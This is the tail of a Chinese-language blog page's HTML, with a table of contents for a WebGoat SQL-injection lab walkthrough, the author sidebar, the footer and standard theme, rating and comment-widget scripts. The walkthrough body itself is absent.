+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#WebGoat-版本信息"><span class="nav-number">1.</span> <span class="nav-text">WebGoat 版本信息</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#A1-Injection-注入"><span class="nav-number">2.</span> <span class="nav-text">(A1) Injection 注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL-Injection-intro"><span class="nav-number">2.1.</span> <span class="nav-text">SQL Injection (intro)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-Concept"><span class="nav-number">2.1.1.</span> <span class="nav-text">1 - Concept</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-What-is-SQL"><span class="nav-number">2.1.2.</span> <span class="nav-text">2 - What is SQL?</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-DML"><span class="nav-number">2.1.3.</span> <span class="nav-text">3 - DML</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-DDL"><span class="nav-number">2.1.4.</span> <span class="nav-text">4 - DDL</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-DCL"><span class="nav-number">2.1.5.</span> <span class="nav-text">5 - DCL</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-amp-7-amp-8-What-is-SQL-injection"><span class="nav-number">2.1.6.</span> <span class="nav-text">6 &amp; 7 &amp; 8 - What is SQL injection?</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#9-Try-It"><span class="nav-number">2.1.7.</span> <span class="nav-text">9 - Try It!</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#10-Numeric-SQL-Injection"><span class="nav-number">2.1.8.</span> <span class="nav-text">10 - Numeric SQL Injection</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#11-String-SQL-Injection"><span class="nav-number">2.1.9.</span> <span class="nav-text">11 - String SQL Injection</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#12-Compromising-Integrity-with-Query-chaining"><span class="nav-number">2.1.10.</span> <span class="nav-text">12 - Compromising Integrity with Query chaining</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#13-Compromising-Availability"><span class="nav-number">2.1.11.</span> <span class="nav-text">13 - Compromising Availability</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#总结"><span class="nav-number">2.1.12.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL-Injection-advanced"><span class="nav-number">2.2.</span> <span class="nav-text">SQL Injection (advanced)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-2"><span class="nav-number">2.2.1.</span> <span class="nav-text">1,2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3"><span class="nav-number">2.2.2.</span> <span class="nav-text">3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4"><span class="nav-number">2.2.3.</span> <span class="nav-text">4</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5"><span class="nav-number">2.2.4.</span> <span class="nav-text">5</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="UPWNothing"
+      src="/images/icon.jpeg">
+  <p class="site-author-name" itemprop="name">UPWNothing</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">21</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">31</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+  <div class="languages">
+    <label class="lang-select-label">
+      <i class="fa fa-language"></i>
+      <span>简体中文</span>
+      <i class="fa fa-angle-up" aria-hidden="true"></i>
+    </label>
+    <select class="lang-select" data-canonical="">
+      
+        <option value="zh-CN" data-href="/3dea2b22/" selected="">
+          简体中文
+        </option>
+      
+        <option value="en" data-href="/en/3dea2b22/" selected="">
+          English
+        </option>
+      
+    </select>
+  </div>
+
+        
+
+<div class="copyright">
+  
+  &copy; 2017 – 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="paw"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">UPWNothing</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="站点总字数">34k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">31 分钟</span>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script color='72,97,152' opacity='0.8' zIndex='' count='150' src="//cdn.jsdelivr.net/gh/theme-next/theme-next-canvas-nest@1/canvas-nest-nomobile.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/lozad@1/dist/lozad.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+  <script>
+  if (CONFIG.page.isPost) {
+    wpac_init = window.wpac_init || [];
+    wpac_init.push({
+      widget: 'Rating',
+      id    : 22859,
+      el    : 'wpac-rating',
+      color : 'fc6423'
+    });
+    (function() {
+      if ('WIDGETPACK_LOADED' in window) return;
+      WIDGETPACK_LOADED = true;
+      var mc = document.createElement('script');
+      mc.type = 'text/javascript';
+      mc.async = true;
+      mc.src = '//embed.widgetpack.com/widget.js';
+      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(mc, s.nextSibling);
+    })();
+  }
+  </script>
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/valine@1/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : false,
+      appId      : 'DUtYTL3VYq8Mgbo2uSd9pEE8-9Nh9j0Va',
+      appKey     : 'RFEfNupULNUbbjBv7Cw7J4Ls',
+      placeholder: "请留下您的评论～（填写邮箱的话，有回复时会通过邮箱提醒哦～邮箱并不会显示在评论中）",
+      avatar     : 'monsterid',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : true,
+      lang       : 'en' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : true,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
